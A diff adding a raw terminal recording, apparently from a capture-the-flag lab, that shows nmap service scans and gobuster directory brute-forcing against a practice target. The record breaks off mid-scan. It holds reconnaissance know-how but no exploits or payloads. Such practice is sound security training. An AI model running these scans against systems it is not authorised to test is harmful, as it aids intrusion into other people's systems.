@@ -1,0 +1,340 @@
+Script started on 2021-04-03 19:55:14+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="203" LINES="53"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ nmap -sC -sV -p 80 10.10.86.202
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 19:55 +0530
+Nmap scan report for 10.10.86.202 (10.10.86.202)
+Host is up (0.24s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ nmap -sC -sV -p 80 10.10.86.202[C[1P 10.10.86.202[1P 10.10.86.2022 10.10.86.2022 10.10.86.202
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 19:57 +0530
+Nmap scan report for 10.10.86.202 (10.10.86.202)
+Host is up (0.17s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ gobuster -x php,txt,html  -u 10.10.86.202 -w /usr/share/wordlists/big.txt 
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.86.202/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/big.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : txt,html,php
+[+] Timeout      : 10s
+=====================================================
+2021/04/03 20:00:35 Starting gobuster
+=====================================================
+Progress: 10 / 20476 (0.05%)Progress: 14 / 20476 (0.07%)[2K/.htaccess (Status: 403)
+[2K/.htaccess.php (Status: 403)
+[2K/.htaccess.txt (Status: 403)
+[2K/.htaccess.html (Status: 403)
+Progress: 24 / 20476 (0.12%)[2K/.htpasswd (Status: 403)
+[2K/.htpasswd.php (Status: 403)
+[2K/.htpasswd.txt (Status: 403)
+[2K/.htpasswd.html (Status: 403)
+Progress: 38 / 20476 (0.19%)Progress: 57 / 20476 (0.28%)Progress: 67 / 20476 (0.33%)Progress: 78 / 20476 (0.38%)Progress: 88 / 20476 (0.43%)Progress: 101 / 20476 (0.49%)Progress: 109 / 20476 (0.53%)Progress: 119 / 20476 (0.58%)Progress: 136 / 20476 (0.66%)Progress: 146 / 20476 (0.71%)Progress: 159 / 20476 (0.78%)Progress: 169 / 20476 (0.83%)Progress: 179 / 20476 (0.87%)Progress: 190 / 20476 (0.93%)Progress: 203 / 20476 (0.99%)Progress: 216 / 20476 (1.05%)Progress: 225 / 20476 (1.10%)Progress: 235 / 20476 (1.15%)Progress: 245 / 20476 (1.20%)Progress: 255 / 20476 (1.25%)Progress: 267 / 20476 (1.30%)Progress: 280 / 20476 (1.37%)Progress: 292 / 20476 (1.43%)Progress: 303 / 20476 (1.48%)Progress: 312 / 20476 (1.52%)Progress: 324 / 20476 (1.58%)Progress: 335 / 20476 (1.64%)Progress: 344 / 20476 (1.68%)Progress: 355 / 20476 (1.73%)Progress: 365 / 20476 (1.78%)Progress: 378 / 20476 (1.85%)Progress: 390 / 20476 (1.90%)Progress: 400 / 20476 (1.95%)Progress: 411 / 20476 (2.01%)Progress: 423 / 20476 (2.07%)Progress: 433 / 20476 (2.11%)Progress: 442 / 20476 (2.16%)Progress: 452 / 20476 (2.21%)Progress: 463 / 20476 (2.26%)Progress: 475 / 20476 (2.32%)Progress: 488 / 20476 (2.38%)Progress: 500 / 20476 (2.44%)Progress: 509 / 20476 (2.49%)Progress: 521 / 20476 (2.54%)Progress: 532 / 20476 (2.60%)Progress: 543 / 20476 (2.65%)Progress: 555 / 20476 (2.71%)Progress: 567 / 20476 (2.77%)Progress: 579 / 20476 (2.83%)Progress: 588 / 20476 (2.87%)Progress: 600 / 20476 (2.93%)Progress: 613 / 20476 (2.99%)Progress: 622 / 20476 (3.04%)Progress: 634 / 20476 (3.10%)Progress: 647 / 20476 (3.16%)Progress: 658 / 20476 (3.21%)Progress: 670 / 20476 (3.27%)Progress: 683 / 20476 (3.34%)Progress: 694 / 20476 (3.39%)Progress: 707 / 20476 (3.45%)Progress: 718 / 20476 (3.51%)Progress: 730 / 20476 (3.57%)Progress: 740 / 20476 (3.61%)Progress: 753 / 20476 (3.68%)Progress: 763 / 20476 (3.73%)Progress: 775 / 20476 (3.78%)Progress: 786 / 20476 (3.84%)Progress: 797 / 20476 (3.89%)Progress: 809 / 20476 (3.95%)Progress: 820 / 20476 (4.00%)Progress: 830 / 20476 (4.05%)Progress: 839 / 20476 (4.10%)Progress: 852 / 20476 (4.16%)Progress: 863 / 20476 (4.21%)Progress: 877 / 20476 (4.28%)Progress: 887 / 20476 (4.33%)Progress: 896 / 20476 (4.38%)Progress: 908 / 20476 (4.43%)Progress: 919 / 20476 (4.49%)Progress: 929 / 20476 (4.54%)Progress: 939 / 20476 (4.59%)Progress: 952 / 20476 (4.65%)Progress: 962 / 20476 (4.70%)Progress: 974 / 20476 (4.76%)Progress: 986 / 20476 (4.82%)Progress: 997 / 20476 (4.87%)Progress: 1009 / 20476 (4.93%)Progress: 1013 / 20476 (4.95%)Progress: 1026 / 20476 (5.01%)Progress: 1039 / 20476 (5.07%)Progress: 1049 / 20476 (5.12%)Progress: 1060 / 20476 (5.18%)Progress: 1070 / 20476 (5.23%)Progress: 1079 / 20476 (5.27%)Progress: 1091 / 20476 (5.33%)Progress: 1104 / 20476 (5.39%)Progress: 1115 / 20476 (5.45%)Progress: 1126 / 20476 (5.50%)Progress: 1139 / 20476 (5.56%)Progress: 1150 / 20476 (5.62%)Progress: 1158 / 20476 (5.66%)Progress: 1171 / 20476 (5.72%)Progress: 1180 / 20476 (5.76%)Progress: 1192 / 20476 (5.82%)Progress: 1203 / 20476 (5.88%)Progress: 1215 / 20476 (5.93%)Progress: 1227 / 20476 (5.99%)Progress: 1236 / 20476 (6.04%)Progress: 1245 / 20476 (6.08%)Progress: 1257 / 20476 (6.14%)Progress: 1269 / 20476 (6.20%)Progress: 1285 / 20476 (6.28%)Progress: 1297 / 20476 (6.33%)Progress: 1306 / 20476 (6.38%)Progress: 1324 / 20476 (6.47%)Progress: 1335 / 20476 (6.52%)Progress: 1345 / 20476 (6.57%)Progress: 1355 / 20476 (6.62%)Progress: 1367 / 20476 (6.68%)Progress: 1378 / 20476 (6.73%)Progress: 1395 / 20476 (6.81%)Progress: 1406 / 20476 (6.87%)Progress: 1417 / 20476 (6.92%)Progress: 1427 / 20476 (6.97%)Progress: 1440 / 20476 (7.03%)Progress: 1453 / 20476 (7.10%)Progress: 1461 / 20476 (7.14%)Progress: 1474 / 20476 (7.20%)Progress: 1485 / 20476 (7.25%)Progress: 1494 / 20476 (7.30%)Progress: 1508 / 20476 (7.36%)Progress: 1522 / 20476 (7.43%)Progress: 1532 / 20476 (7.48%)Progress: 1544 / 20476 (7.54%)Progress: 1556 / 20476 (7.60%)Progress: 1564 / 20476 (7.64%)Progress: 1578 / 20476 (7.71%)Progress: 1588 / 20476 (7.76%)Progress: 1600 / 20476 (7.81%)Progress: 1612 / 20476 (7.87%)Progress: 1621 / 20476 (7.92%)Progress: 1632 / 20476 (7.97%)Progress: 1645 / 20476 (8.03%)Progress: 1657 / 20476 (8.09%)Progress: 1667 / 20476 (8.14%)Progress: 1677 / 20476 (8.19%)Progress: 1687 / 20476 (8.24%)Progress: 1697 / 20476 (8.29%)Progress: 1710 / 20476 (8.35%)Progress: 1720 / 20476 (8.40%)Progress: 1733 / 20476 (8.46%)Progress: 1745 / 20476 (8.52%)Progress: 1755 / 20476 (8.57%)Progress: 1765 / 20476 (8.62%)Progress: 1778 / 20476 (8.68%)Progress: 1788 / 20476 (8.73%)Progress: 1798 / 20476 (8.78%)Progress: 1808 / 20476 (8.83%)Progress: 1822 / 20476 (8.90%)Progress: 1832 / 20476 (8.95%)^C
+[!] Keyboard interrupt detected, terminating.
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_101.php: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_cms: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin3.html: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin4_colon.txt: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin4.txt: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_area.php: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_c: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin888.txt: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin4_account.html: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_.php: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin2009.html: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_common: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_cp: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_custom: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_files: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_images: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_interface: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_login: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_media: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_menu: context canceled
+[2K2021/04/03 20:03:18 [!] Get http://10.10.86.202/admin_logon: context canceled
+[2K=====================================================
+2021/04/03 20:03:18 Finished
+=====================================================
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ gobuster -x php,txt,html  -u 10.10.86.202 -w /usr/share/wordlists/big.txt [1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1@ 
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.86.202/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/big.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2021/04/03 20:03:28 Starting gobuster
+=====================================================
+Progress: 11 / 20476 (0.05%)[2K/.htpasswd (Status: 403)
+[2K/.htaccess (Status: 403)
+Progress: 46 / 20476 (0.22%)Progress: 86 / 20476 (0.42%)Progress: 129 / 20476 (0.63%)Progress: 171 / 20476 (0.84%)Progress: 203 / 20476 (0.99%)Progress: 244 / 20476 (1.19%)Progress: 279 / 20476 (1.36%)Progress: 322 / 20476 (1.57%)Progress: 367 / 20476 (1.79%)Progress: 408 / 20476 (1.99%)Progress: 439 / 20476 (2.14%)Progress: 478 / 20476 (2.33%)Progress: 517 / 20476 (2.52%)Progress: 553 / 20476 (2.70%)Progress: 597 / 20476 (2.92%)Progress: 639 / 20476 (3.12%)Progress: 681 / 20476 (3.33%)Progress: 717 / 20476 (3.50%)Progress: 761 / 20476 (3.72%)Progress: 803 / 20476 (3.92%)Progress: 847 / 20476 (4.14%)Progress: 883 / 20476 (4.31%)Progress: 925 / 20476 (4.52%)Progress: 964 / 20476 (4.71%)Progress: 999 / 20476 (4.88%)Progress: 1044 / 20476 (5.10%)Progress: 1080 / 20476 (5.27%)Progress: 1121 / 20476 (5.47%)Progress: 1163 / 20476 (5.68%)Progress: 1194 / 20476 (5.83%)Progress: 1231 / 20476 (6.01%)Progress: 1274 / 20476 (6.22%)Progress: 1317 / 20476 (6.43%)Progress: 1358 / 20476 (6.63%)Progress: 1393 / 20476 (6.80%)Progress: 1437 / 20476 (7.02%)Progress: 1479 / 20476 (7.22%)Progress: 1522 / 20476 (7.43%)Progress: 1564 / 20476 (7.64%)Progress: 1596 / 20476 (7.79%)Progress: 1638 / 20476 (8.00%)Progress: 1678 / 20476 (8.19%)Progress: 1719 / 20476 (8.40%)Progress: 1751 / 20476 (8.55%)Progress: 1793 / 20476 (8.76%)Progress: 1834 / 20476 (8.96%)Progress: 1874 / 20476 (9.15%)Progress: 1908 / 20476 (9.32%)Progress: 1944 / 20476 (9.49%)Progress: 1985 / 20476 (9.69%)Progress: 2029 / 20476 (9.91%)Progress: 2069 / 20476 (10.10%)Progress: 2112 / 20476 (10.31%)Progress: 2153 / 20476 (10.51%)Progress: 2197 / 20476 (10.73%)Progress: 2237 / 20476 (10.92%)Progress: 2271 / 20476 (11.09%)Progress: 2308 / 20476 (11.27%)Progress: 2343 / 20476 (11.44%)Progress: 2385 / 20476 (11.65%)Progress: 2412 / 20476 (11.78%)Progress: 2452 / 20476 (11.97%)Progress: 2497 / 20476 (12.19%)Progress: 2531 / 20476 (12.36%)Progress: 2573 / 20476 (12.57%)Progress: 2607 / 20476 (12.73%)Progress: 2646 / 20476 (12.92%)Progress: 2688 / 20476 (13.13%)Progress: 2734 / 20476 (13.35%)Progress: 2766 / 20476 (13.51%)Progress: 2809 / 20476 (13.72%)Progress: 2851 / 20476 (13.92%)Progress: 2894 / 20476 (14.13%)Progress: 2928 / 20476 (14.30%)Progress: 2970 / 20476 (14.50%)Progress: 3011 / 20476 (14.71%)Progress: 3045 / 20476 (14.87%)Progress: 3086 / 20476 (15.07%)Progress: 3131 / 20476 (15.29%)Progress: 3174 / 20476 (15.50%)Progress: 3216 / 20476 (15.71%)Progress: 3252 / 20476 (15.88%)Progress: 3295 / 20476 (16.09%)Progress: 3335 / 20476 (16.29%)Progress: 3375 / 20476 (16.48%)Progress: 3410 / 20476 (16.65%)Progress: 3453 / 20476 (16.86%)Progress: 3495 / 20476 (17.07%)Progress: 3530 / 20476 (17.24%)Progress: 3574 / 20476 (17.45%)Progress: 3609 / 20476 (17.63%)Progress: 3649 / 20476 (17.82%)Progress: 3682 / 20476 (17.98%)Progress: 3724 / 20476 (18.19%)Progress: 3769 / 20476 (18.41%)Progress: 3803 / 20476 (18.57%)Progress: 3848 / 20476 (18.79%)Progress: 3891 / 20476 (19.00%)Progress: 3923 / 20476 (19.16%)Progress: 3965 / 20476 (19.36%)Progress: 4006 / 20476 (19.56%)Progress: 4050 / 20476 (19.78%)Progress: 4096 / 20476 (20.00%)Progress: 4139 / 20476 (20.21%)Progress: 4180 / 20476 (20.41%)Progress: 4227 / 20476 (20.64%)Progress: 4251 / 20476 (20.76%)Progress: 4265 / 20476 (20.83%)Progress: 4306 / 20476 (21.03%)Progress: 4349 / 20476 (21.24%)Progress: 4392 / 20476 (21.45%)Progress: 4432 / 20476 (21.64%)Progress: 4474 / 20476 (21.85%)Progress: 4500 / 20476 (21.98%)Progress: 4547 / 20476 (22.21%)Progress: 4584 / 20476 (22.39%)Progress: 4616 / 20476 (22.54%)Progress: 4659 / 20476 (22.75%)Progress: 4702 / 20476 (22.96%)Progress: 4744 / 20476 (23.17%)Progress: 4776 / 20476 (23.32%)Progress: 4816 / 20476 (23.52%)Progress: 4852 / 20476 (23.70%)Progress: 4896 / 20476 (23.91%)Progress: 4932 / 20476 (24.09%)Progress: 4968 / 20476 (24.26%)Progress: 5011 / 20476 (24.47%)Progress: 5052 / 20476 (24.67%)Progress: 5096 / 20476 (24.89%)Progress: 5142 / 20476 (25.11%)Progress: 5184 / 20476 (25.32%)Progress: 5224 / 20476 (25.51%)Progress: 5255 / 20476 (25.66%)Progress: 5298 / 20476 (25.87%)Progress: 5339 / 20476 (26.07%)Progress: 5384 / 20476 (26.29%)Progress: 5428 / 20476 (26.51%)Progress: 5462 / 20476 (26.68%)Progress: 5495 / 20476 (26.84%)Progress: 5536 / 20476 (27.04%)Progress: 5580 / 20476 (27.25%)Progress: 5611 / 20476 (27.40%)Progress: 5656 / 20476 (27.62%)Progress: 5698 / 20476 (27.83%)Progress: 5740 / 20476 (28.03%)Progress: 5785 / 20476 (28.25%)Progress: 5821 / 20476 (28.43%)Progress: 5853 / 20476 (28.58%)Progress: 5896 / 20476 (28.79%)Progress: 5921 / 20476 (28.92%)Progress: 5965 / 20476 (29.13%)Progress: 6007 / 20476 (29.34%)Progress: 6049 / 20476 (29.54%)Progress: 6094 / 20476 (29.76%)Progress: 6123 / 20476 (29.90%)Progress: 6168 / 20476 (30.12%)Progress: 6212 / 20476 (30.34%)Progress: 6247 / 20476 (30.51%)Progress: 6283 / 20476 (30.68%)Progress: 6326 / 20476 (30.89%)Progress: 6361 / 20476 (31.07%)Progress: 6405 / 20476 (31.28%)Progress: 6449 / 20476 (31.50%)Progress: 6490 / 20476 (31.70%)Progress: 6526 / 20476 (31.87%)Progress: 6567 / 20476 (32.07%)Progress: 6603 / 20476 (32.25%)Progress: 6643 / 20476 (32.44%)Progress: 6687 / 20476 (32.66%)Progress: 6727 / 20476 (32.85%)Progress: 6770 / 20476 (33.06%)Progress: 6801 / 20476 (33.21%)Progress: 6843 / 20476 (33.42%)Progress: 6886 / 20476 (33.63%)Progress: 6921 / 20476 (33.80%)Progress: 6948 / 20476 (33.93%)Progress: 6990 / 20476 (34.14%)Progress: 7032 / 20476 (34.34%)Progress: 7073 / 20476 (34.54%)Progress: 7107 / 20476 (34.71%)Progress: 7141 / 20476 (34.87%)Progress: 7184 / 20476 (35.08%)Progress: 7230 / 20476 (35.31%)Progress: 7265 / 20476 (35.48%)Progress: 7306 / 20476 (35.68%)Progress: 7348 / 20476 (35.89%)Progress: 7381 / 20476 (36.05%)Progress: 7423 / 20476 (36.25%)Progress: 7458 / 20476 (36.42%)Progress: 7501 / 20476 (36.63%)Progress: 7544 / 20476 (36.84%)Progress: 7587 / 20476 (37.05%)Progress: 7612 / 20476 (37.18%)Progress: 7652 / 20476 (37.37%)Progress: 7694 / 20476 (37.58%)Progress: 7735 / 20476 (37.78%)Progress: 7769 / 20476 (37.94%)Progress: 7811 / 20476 (38.15%)Progress: 7855 / 20476 (38.36%)Progress: 7897 / 20476 (38.57%)Progress: 7938 / 20476 (38.77%)Progress: 7965 / 20476 (38.90%)Progress: 8003 / 20476 (39.08%)Progress: 8048 / 20476 (39.30%)Progress: 8082 / 20476 (39.47%)Progress: 8116 / 20476 (39.64%)Progress: 8155 / 20476 (39.83%)Progress: 8198 / 20476 (40.04%)Progress: 8235 / 20476 (40.22%)Progress: 8265 / 20476 (40.36%)Progress: 8306 / 20476 (40.56%)Progress: 8352 / 20476 (40.79%)Progress: 8391 / 20476 (40.98%)Progress: 8432 / 20476 (41.18%)Progress: 8475 / 20476 (41.39%)Progress: 8516 / 20476 (41.59%)Progress: 8558 / 20476 (41.80%)Progress: 8599 / 20476 (42.00%)Progress: 8630 / 20476 (42.15%)Progress: 8674 / 20476 (42.36%)Progress: 8714 / 20476 (42.56%)Progress: 8757 / 20476 (42.77%)Progress: 8793 / 20476 (42.94%)Progress: 8836 / 20476 (43.15%)Progress: 8879 / 20476 (43.36%)Progress: 8925 / 20476 (43.59%)Progress: 8957 / 20476 (43.74%)Progress: 8999 / 20476 (43.95%)Progress: 9035 / 20476 (44.12%)Progress: 9068 / 20476 (44.29%)Progress: 9103 / 20476 (44.46%)Progress: 9145 / 20476 (44.66%)Progress: 9188 / 20476 (44.87%)Progress: 9229 / 20476 (45.07%)Progress: 9271 / 20476 (45.28%)Progress: 9297 / 20476 (45.40%)Progress: 9320 / 20476 (45.52%)Progress: 9362 / 20476 (45.72%)Progress: 9395 / 20476 (45.88%)Progress: 9437 / 20476 (46.09%)Progress: 9470 / 20476 (46.25%)Progress: 9514 / 20476 (46.46%)Progress: 9556 / 20476 (46.67%)Progress: 9599 / 20476 (46.88%)Progress: 9631 / 20476 (47.04%)Progress: 9674 / 20476 (47.25%)Progress: 9715 / 20476 (47.45%)Progress: 9757 / 20476 (47.65%)Progress: 9792 / 20476 (47.82%)Progress: 9836 / 20476 (48.04%)Progress: 9870 / 20476 (48.20%)Progress: 9912 / 20476 (48.41%)Progress: 9957 / 20476 (48.63%)Progress: 10000 / 20476 (48.84%)Progress: 10043 / 20476 (49.05%)Progress: 10081 / 20476 (49.23%)Progress: 10117 / 20476 (49.41%)Progress: 10157 / 20476 (49.60%)Progress: 10200 / 20476 (49.81%)Progress: 10244 / 20476 (50.03%)Progress: 10279 / 20476 (50.20%)Progress: 10322 / 20476 (50.41%)Progress: 10364 / 20476 (50.62%)Progress: 10407 / 20476 (50.83%)Progress: 10450 / 20476 (51.04%)Progress: 10496 / 20476 (51.26%)Progress: 10532 / 20476 (51.44%)Progress: 10568 / 20476 (51.61%)Progress: 10613 / 20476 (51.83%)Progress: 10645 / 20476 (51.99%)Progress: 10684 / 20476 (52.18%)Progress: 10727 / 20476 (52.39%)Progress: 10769 / 20476 (52.59%)Progress: 10813 / 20476 (52.81%)Progress: 10855 / 20476 (53.01%)Progress: 10899 / 20476 (53.23%)Progress: 10931 / 20476 (53.38%)Progress: 10973 / 20476 (53.59%)Progress: 11019 / 20476 (53.81%)Progress: 11063 / 20476 (54.03%)Progress: 11096 / 20476 (54.19%)Progress: 11139 / 20476 (54.40%)Progress: 11177 / 20476 (54.59%)Progress: 11219 / 20476 (54.79%)Progress: 11260 / 20476 (54.99%)Progress: 11296 / 20476 (55.17%)Progress: 11330 / 20476 (55.33%)Progress: 11370 / 20476 (55.53%)Progress: 11411 / 20476 (55.73%)Progress: 11456 / 20476 (55.95%)Progress: 11491 / 20476 (56.12%)Progress: 11526 / 20476 (56.29%)Progress: 11570 / 20476 (56.51%)Progress: 11614 / 20476 (56.72%)Progress: 11649 / 20476 (56.89%)Progress: 11684 / 20476 (57.06%)Progress: 11729 / 20476 (57.28%)Progress: 11772 / 20476 (57.49%)Progress: 11815 / 20476 (57.70%)Progress: 11850 / 20476 (57.87%)Progress: 11890 / 20476 (58.07%)Progress: 11931 / 20476 (58.27%)Progress: 11973 / 20476 (58.47%)Progress: 12007 / 20476 (58.64%)Progress: 12049 / 20476 (58.84%)Progress: 12094 / 20476 (59.06%)Progress: 12134 / 20476 (59.26%)Progress: 12159 / 20476 (59.38%)Progress: 12203 / 20476 (59.60%)Progress: 12246 / 20476 (59.81%)Progress: 12283 / 20476 (59.99%)Progress: 12323 / 20476 (60.18%)Progress: 12357 / 20476 (60.35%)Progress: 12403 / 20476 (60.57%)Progress: 12446 / 20476 (60.78%)Progress: 12480 / 20476 (60.95%)Progress: 12522 / 20476 (61.15%)Progress: 12564 / 20476 (61.36%)Progress: 12603 / 20476 (61.55%)Progress: 12644 / 20476 (61.75%)Progress: 12679 / 20476 (61.92%)Progress: 12719 / 20476 (62.12%)Progress: 12764 / 20476 (62.34%)Progress: 12806 / 20476 (62.54%)Progress: 12845 / 20476 (62.73%)Progress: 12888 / 20476 (62.94%)Progress: 12921 / 20476 (63.10%)Progress: 12954 / 20476 (63.26%)Progress: 12995 / 20476 (63.46%)Progress: 13030 / 20476 (63.64%)Progress: 13075 / 20476 (63.86%)Progress: 13117 / 20476 (64.06%)Progress: 13152 / 20476 (64.23%)Progress: 13196 / 20476 (64.45%)Progress: 13238 / 20476 (64.65%)Progress: 13281 / 20476 (64.86%)Progress: 13314 / 20476 (65.02%)Progress: 13357 / 20476 (65.23%)Progress: 13388 / 20476 (65.38%)Progress: 13431 / 20476 (65.59%)Progress: 13475 / 20476 (65.81%)Progress: 13508 / 20476 (65.97%)Progress: 13550 / 20476 (66.18%)Progress: 13593 / 20476 (66.39%)Progress: 13635 / 20476 (66.59%)Progress: 13676 / 20476 (66.79%)Progress: 13711 / 20476 (66.96%)Progress: 13755 / 20476 (67.18%)Progress: 13791 / 20476 (67.35%)Progress: 13832 / 20476 (67.55%)Progress: 13873 / 20476 (67.75%)Progress: 13915 / 20476 (67.96%)Progress: 13949 / 20476 (68.12%)Progress: 13991 / 20476 (68.33%)Progress: 14025 / 20476 (68.49%)Progress: 14067 / 20476 (68.70%)Progress: 14111 / 20476 (68.91%)Progress: 14156 / 20476 (69.13%)Progress: 14201 / 20476 (69.35%)Progress: 14258 / 20476 (69.63%)Progress: 14306 / 20476 (69.87%)Progress: 14350 / 20476 (70.08%)Progress: 14390 / 20476 (70.28%)Progress: 14431 / 20476 (70.48%)Progress: 14472 / 20476 (70.68%)Progress: 14516 / 20476 (70.89%)Progress: 14556 / 20476 (71.09%)Progress: 14591 / 20476 (71.26%)Progress: 14636 / 20476 (71.48%)Progress: 14680 / 20476 (71.69%)Progress: 14723 / 20476 (71.90%)Progress: 14757 / 20476 (72.07%)Progress: 14791 / 20476 (72.24%)Progress: 14836 / 20476 (72.46%)Progress: 14876 / 20476 (72.65%)Progress: 14919 / 20476 (72.86%)Progress: 14953 / 20476 (73.03%)Progress: 14999 / 20476 (73.25%)Progress: 15040 / 20476 (73.45%)Progress: 15073 / 20476 (73.61%)Progress: 15106 / 20476 (73.77%)Progress: 15145 / 20476 (73.96%)Progress: 15188 / 20476 (74.17%)Progress: 15229 / 20476 (74.37%)Progress: 15263 / 20476 (74.54%)Progress: 15305 / 20476 (74.75%)Progress: 15344 / 20476 (74.94%)Progress: 15388 / 20476 (75.15%)Progress: 15423 / 20476 (75.32%)Progress: 15458 / 20476 (75.49%)Progress: 15496 / 20476 (75.68%)Progress: 15540 / 20476 (75.89%)Progress: 15582 / 20476 (76.10%)Progress: 15617 / 20476 (76.27%)Progress: 15658 / 20476 (76.47%)Progress: 15700 / 20476 (76.68%)Progress: 15734 / 20476 (76.84%)Progress: 15776 / 20476 (77.05%)Progress: 15820 / 20476 (77.26%)Progress: 15863 / 20476 (77.47%)Progress: 15905 / 20476 (77.68%)Progress: 15939 / 20476 (77.84%)Progress: 15981 / 20476 (78.05%)Progress: 16021 / 20476 (78.24%)Progress: 16059 / 20476 (78.43%)Progress: 16094 / 20476 (78.60%)Progress: 16134 / 20476 (78.79%)Progress: 16176 / 20476 (79.00%)Progress: 16219 / 20476 (79.21%)[2K/server-status (Status: 403)
+Progress: 16254 / 20476 (79.38%)Progress: 16288 / 20476 (79.55%)Progress: 16328 / 20476 (79.74%)Progress: 16371 / 20476 (79.95%)Progress: 16405 / 20476 (80.12%)Progress: 16439 / 20476 (80.28%)Progress: 16484 / 20476 (80.50%)Progress: 16527 / 20476 (80.71%)Progress: 16562 / 20476 (80.88%)Progress: 16605 / 20476 (81.09%)Progress: 16651 / 20476 (81.32%)Progress: 16690 / 20476 (81.51%)Progress: 16726 / 20476 (81.69%)Progress: 16769 / 20476 (81.90%)Progress: 16808 / 20476 (82.09%)Progress: 16844 / 20476 (82.26%)Progress: 16888 / 20476 (82.48%)Progress: 16929 / 20476 (82.68%)Progress: 16963 / 20476 (82.84%)Progress: 17002 / 20476 (83.03%)Progress: 17037 / 20476 (83.20%)Progress: 17080 / 20476 (83.41%)Progress: 17122 / 20476 (83.62%)Progress: 17154 / 20476 (83.78%)Progress: 17199 / 20476 (84.00%)Progress: 17231 / 20476 (84.15%)Progress: 17266 / 20476 (84.32%)Progress: 17301 / 20476 (84.49%)Progress: 17345 / 20476 (84.71%)Progress: 17390 / 20476 (84.93%)Progress: 17430 / 20476 (85.12%)Progress: 17464 / 20476 (85.29%)Progress: 17507 / 20476 (85.50%)Progress: 17550 / 20476 (85.71%)Progress: 17593 / 20476 (85.92%)Progress: 17627 / 20476 (86.09%)Progress: 17671 / 20476 (86.30%)Progress: 17716 / 20476 (86.52%)Progress: 17758 / 20476 (86.73%)Progress: 17790 / 20476 (86.88%)Progress: 17826 / 20476 (87.06%)Progress: 17869 / 20476 (87.27%)Progress: 17904 / 20476 (87.44%)Progress: 17945 / 20476 (87.64%)Progress: 17972 / 20476 (87.77%)Progress: 18006 / 20476 (87.94%)Progress: 18045 / 20476 (88.13%)Progress: 18078 / 20476 (88.29%)Progress: 18115 / 20476 (88.47%)Progress: 18158 / 20476 (88.68%)Progress: 18200 / 20476 (88.88%)Progress: 18243 / 20476 (89.09%)Progress: 18277 / 20476 (89.26%)Progress: 18320 / 20476 (89.47%)Progress: 18351 / 20476 (89.62%)Progress: 18392 / 20476 (89.82%)Progress: 18429 / 20476 (90.00%)Progress: 18472 / 20476 (90.21%)Progress: 18517 / 20476 (90.43%)Progress: 18559 / 20476 (90.64%)Progress: 18600 / 20476 (90.84%)Progress: 18635 / 20476 (91.01%)Progress: 18678 / 20476 (91.22%)Progress: 